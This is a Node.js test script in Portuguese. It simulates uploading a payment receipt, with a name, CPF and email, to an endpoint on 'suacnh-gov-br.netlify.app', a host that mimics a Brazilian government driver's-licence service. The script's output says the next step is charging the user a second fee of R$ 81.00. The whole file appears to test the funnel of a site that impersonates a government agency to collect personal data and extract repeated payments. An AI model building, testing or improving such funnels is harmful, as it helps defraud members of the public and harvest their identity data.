const https = require('https');
const fs = require('fs');

// Criar uma imagem PNG real para simular comprovante
const pngBuffer = Buffer.from([
  0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D, 
  0x49, 0x48, 0x44, 0x52, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 
  0x08, 0x02, 0x00, 0x00, 0x00, 0x90, 0x77, 0x53, 0xDE, 0x00, 0x00, 0x00, 
  0x0C, 0x49, 0x44, 0x41, 0x54, 0x08, 0x99, 0x63, 0xF8, 0xCF, 0xC0, 0x00, 
  0x00, 0x03, 0x01, 0x01, 0x00, 0x18, 0xDD, 0x8D, 0xB4, 0x00, 0x00, 0x00, 
  0x00, 0x49, 0x45, 0x4E, 0x44, 0xAE, 0x42, 0x60, 0x82
]);

const base64Image = pngBuffer.toString('base64');
const dataUrl = `data:image/png;base64,${base64Image}`;
const transactionId = 'funil_completo_' + Date.now();

console.log('╔════════════════════════════════════════════════════════════╗');
console.log('║  TESTE COMPLETO DO FUNIL - ENVIAR COMPROVANTE             ║');
console.log('╚════════════════════════════════════════════════════════════╝\n');

console.log('📋 Dados da Simulação:');
console.log('├─ Transaction ID: ' + transactionId);
console.log('├─ Nome: João Silva');
console.log('├─ CPF: 12345678901');
console.log('├─ Email: joao@email.com');
console.log('├─ Imagem: comprovante.png (1x1 PNG real)');
console.log('└─ Ação: Clicando botão "Enviar Comprovante"\n');

const payload = {
  transaction_id: transactionId,
  customer_name: 'João Silva',
  customer_cpf: '12345678901',
  customer_email: 'joao@email.com',
  arquivo: dataUrl,
  filename: 'comprovante.png'
};

const payloadStr = JSON.stringify(payload);
const payloadBuffer = Buffer.from(payloadStr);

const options = {
  hostname: 'suacnh-gov-br.netlify.app',
  port: 443,
  path: '/api/comprovantes-upload',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': payloadBuffer.length
  }
};

console.log('🚀 Enviando para: https://suacnh-gov-br.netlify.app/api/comprovantes-upload\n');
console.log('⏳ Processando...\n');

const req = https.request(options, (res) => {
  let data = '';

  res.on('data', (chunk) => {
    data += chunk;
  });

  res.on('end', () => {
    console.log('─'.repeat(60));
    console.log('RESPOSTA DO SERVIDOR');
    console.log('─'.repeat(60));
    console.log('Status HTTP:', res.statusCode);
    
    try {
      const body = JSON.parse(data);
      console.log('Resposta JSON:', JSON.stringify(body, null, 2));
      
      console.log('\n' + '═'.repeat(60));
      if (res.statusCode === 200 && body.success) {
        console.log('✅ ✅ ✅  SUCESSO TOTAL!  ✅ ✅ ✅');
        console.log('═'.repeat(60));
        console.log('\n🎉 Comprovante foi ENVIADO e SALVO no Supabase!');
        console.log('\n📊 Confirmação:');
        console.log('├─ Status: ' + (body.success ? '✅ Salvo' : '❌ Erro'));
        console.log('├─ Transaction ID: ' + transactionId);
        console.log('└─ Próximo passo: Usuário clica para pagar 2ª taxa (R$ 81.00)\n');
        console.log('═'.repeat(60));
      } else {
        console.log('❌ ERRO ao salvar!');
        console.log('═'.repeat(60));
        console.log('Erro:', body.error);
      }
    } catch (e) {
      console.log('Erro ao parsear:', e.message);
      console.log('Dados:', data.substring(0, 200));
    }
  });
});

req.on('error', (e) => {
  console.error('❌ Erro de conexão:', e.message);
});

req.write(payloadBuffer);
req.end();
